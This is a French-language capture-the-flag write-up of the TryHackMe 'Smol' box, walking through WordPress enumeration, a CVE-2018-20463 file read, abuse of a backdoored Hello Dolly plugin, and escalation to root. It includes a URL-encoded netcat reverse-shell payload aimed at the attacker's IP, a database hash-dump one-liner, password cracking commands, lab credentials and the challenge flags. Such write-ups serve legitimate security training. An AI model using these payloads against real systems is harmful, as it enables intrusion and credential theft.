---
title: "Write-up : TryHackMe - Smol"
date: 2025-07-01T00:00:00+02:00
draft: false
author: "AntoineWHR"
tags: ["TryHackMe", "CTF", "Linux", "WordPress", "CVE-2018-20463", "Command Injection", "Privilege Escalation"]
categories: ["WriteUps"]
comment:
enable: true
description: "Solution complète du challenge TryHackMe Smol, de l'exploitation d'un plugin WordPress vulnérable à l'élévation de privilèges."
---

# **Write-up : TryHackMe - Smol [MEDIUM]**

{{< admonition info "Informations sur la Box" >}}
* **Nom :** Smol
* **Plateforme :** TryHackMe
* **Difficulté Annoncée :** Medium
* **Objectif :** Obtenir les flags `user.txt` et `root.txt`.
* **IP cible :** 10.10.224.142
* **IP attaquant :** 10.14.96.113
{{< /admonition >}}

## **Introduction**

Cette box Medium de TryHackMe nous invite à exploiter un site WordPress avec un plugin vulnérable, puis à escalader nos privilèges à travers plusieurs utilisateurs pour finalement obtenir root.

## **Phase 1 : Reconnaissance & Énumération**

### **1. Scan des Ports (Nmap)**

Commençons par identifier les services sur la machine cible avec un scan Nmap complet.

```bash
nmap -sC -sV -p- -T4 10.10.224.142
```

{{< admonition note "Résultats Clés du Scan Nmap" >}}
Le scan révèle deux ports ouverts :
* **Port 22 (SSH) :** OpenSSH 8.2p1 Ubuntu - Service SSH pour l'accès distant
* **Port 80 (HTTP) :** Apache httpd 2.4.41 Ubuntu - Serveur web avec redirection vers `www.smol.thm`

Le serveur web sera notre point d'entrée principal.
{{< /admonition >}}

### **2. Exploration Web & Énumération WordPress**

Le site redirige vers `www.smol.thm`. Après avoir ajouté cette entrée dans `/etc/hosts`, nous découvrons un site WordPress dédié aux CTF.

![Site WordPress AnotherCTF](https://cdn.abacus.ai/images/15db601e-7151-42a3-a0e9-5ae5ba8829f0.png)

Utilisons WPScan pour énumérer les plugins et vulnérabilités :

```bash
wpscan --url http://www.smol.thm
```

{{< admonition tip "Découverte Cruciale - Plugin Vulnérable" >}}
L'énumération révèle le plugin **JSmol2WP** qui présente des vulnérabilités connues. C'est notre point d'entrée !
{{< /admonition >}}

## **Phase 2 : Exploitation - CVE-2018-20463**

### **Recherche de Vulnérabilités**

Après des recherches approfondies sur le plugin JSmol2WP, nous découvrons la **CVE-2018-20463** qui permet la lecture de fichiers arbitraires.

### **Exploitation de la Vulnérabilité**

Cette CVE nous permet d'accéder au fichier `wp-config.php` et d'extraire des informations sensibles :

![Contenu wp-config.php](https://cdn.abacus.ai/images/416595a8-c92f-44dd-a913-3c33abe2cfcb.png)

{{< admonition success "Credentials WordPress Découverts !" >}}
* **Utilisateur :** wpuser
* **Mot de passe :** kbLSF2Vop#lw3rjDZ629*Z%G

Ces credentials nous donnent accès au dashboard WordPress !
{{< /admonition >}}

## **Phase 3 : Accès WordPress & Découverte du Backdoor**

### **Connexion au Dashboard**

Avec les credentials récupérés, nous accédons au dashboard WordPress. Cependant, l'utilisateur `wpuser` a des privilèges limités - pas de possibilité d'upload de fichiers ou de modification de thèmes.

![Dashboard WordPress](https://cdn.abacus.ai/images/9b13c49f-09dd-4db3-b81e-77cc60f81e3f.png)

### **Analyse du Plugin Hello Dolly**

En inspectant le code source du plugin "Hello Dolly", nous découvrons une fonction suspecte encodée en base64. Après décodage, nous révélons un backdoor !

### **Test du Backdoor**

Testons l'exécution de commandes via le paramètre `cmd` :

```
http://www.smol.thm/wp-admin/index.php?cmd=ls
```

![Test du backdoor](https://cdn.abacus.ai/images/8faa5a6c-727a-4fa0-9564-e76fdd05b7a2.png)

{{< admonition success "Command Injection Confirmée !" >}}
Le backdoor fonctionne parfaitement ! Nous pouvons exécuter des commandes système.
{{< /admonition >}}

## **Phase 4 : Obtention d'un Reverse Shell**

### **Configuration du Reverse Shell**

Préparons notre listener netcat :

```bash
nc -lnvp 9001
```

Puis exécutons un payload de reverse shell via le backdoor :

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.14.96.113%209001%20%3E%2Ftmp%2Ff
```

Nous obtenons un shell en tant qu'utilisateur `www-data` !

## **Phase 5 : Énumération des Utilisateurs & Cracking**

### **Extraction des Hashes WordPress**

Utilisons les credentials de base de données pour extraire les hashes des utilisateurs WordPress :

```php
php -r '
$mysqli = new mysqli("localhost", "wpuser", "kbLSF2Vop#lw3rjDZ629*Z%G", "wordpress");
$res = $mysqli->query("SELECT user_login, user_pass FROM wp_users");
while($row = $res->fetch_assoc()) { print_r($row); }
'
```

![Extraction des hashes](https://cdn.abacus.ai/images/ba412e48-0497-42d2-973a-4546d363f411.png)

### **Cracking avec John the Ripper**

```bash
john --wordlist=rockyou.txt hash.hash
```

![john](https://i.imgflip.com/9z19d7.jpg)

{{< admonition success "Mot de Passe Cracké !" >}}
Le hash de l'utilisateur **diego** est cracké : **sandiegocalifornia**

Nous pouvons maintenant nous connecter en SSH !
{{< /admonition >}}
![wwwdata](https://i.imgflip.com/9z1dbn.jpg)

## **Phase 6 : Escalade de Privilèges - Utilisateur Diego**

### **Connexion SSH & Premier Flag**

```bash
ssh diego@10.10.224.142
```

![Premier flag utilisateur](https://cdn.abacus.ai/images/10d507e1-0602-4268-8fed-3de423bf937f.png)

Nous récupérons le premier flag dans le répertoire home de diego !

**Flag user :** `45edaec653ff9ee06236b7ce72b86963`

### **Énumération pour l'Escalade**

En explorant le système, nous découvrons une clé SSH privée dans `/home/think/.ssh/` qui nous permet de nous connecter à l'utilisateur `think`.

## **Phase 7 : Escalade vers l'Utilisateur Think**

### **Utilisation de la Clé SSH**

```bash
ssh -i think_key think@localhost
```

![Connexion utilisateur think](https://cdn.abacus.ai/images/826f6bab-400d-4fbd-ac56-23c751216bc5.png)

Nous sommes maintenant connectés en tant qu'utilisateur `think`.

### **Découverte de l'Archive Protégée**

L'utilisateur `think` peut accéder à l'utilisateur `gege` sans mot de passe et récupérer l'archive `wordpress.old.zip`.

## **Phase 8 : Cracking de l'Archive & Escalade Finale**

### **Extraction du Hash de l'Archive**

```bash
zip2john wordpress.old.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

### **Analyse de l'Archive**

L'archive contient les logs de l'utilisateur `xavi`, nous permettant de nous connecter à ce compte.

![Credentials xavi dans l'archive](https://cdn.abacus.ai/images/7e90754e-ec61-4bb6-a3a2-0d79651add04.png)

### **Escalade Root via Sudo**

En tant qu'utilisateur `xavi`, nous vérifions les privilèges sudo :

```bash
sudo -l
```

![Privilèges sudo de xavi](https://cdn.abacus.ai/images/ca997374-193a-45c7-9534-8326b89f8b7f.png)

{{< admonition success "Root Obtenu !" >}}
L'utilisateur `xavi` peut exécuter des commandes en tant que root ! Nous obtenons finalement l'accès root.
{{< /admonition >}}

### **Récupération du Flag Root**

```bash
sudo su
cat /root/root.txt
```

**Flag root :** `bf89ea3ea01992353aef1f576214d4e4`

![Challenge complété](https://cdn.abacus.ai/images/4a67e93f-5dca-43f2-ae8d-3112cf041032.png)

## **Conclusion**

{{< admonition summary "Résumé de l'Exploitation" >}}
Cette box Smol nous a permis d'explorer :
1. **Énumération WordPress** avec WPScan
2. **Exploitation CVE-2018-20463** pour la lecture de fichiers
3. **Command Injection** via un backdoor dans un plugin
4. **Reverse shell** et pivoting entre utilisateurs
5. **Cracking de hashes** WordPress et d'archives ZIP
6. **Escalade de privilèges** via clés SSH et sudo

Une excellente box pour comprendre l'importance de l'énumération approfondie et les techniques de pivoting entre utilisateurs !
{{< /admonition >}}

Box très instructive pour une "Medium", parfaite pour maîtriser l'exploitation WordPress et les techniques d'escalade de privilèges multi-utilisateurs.
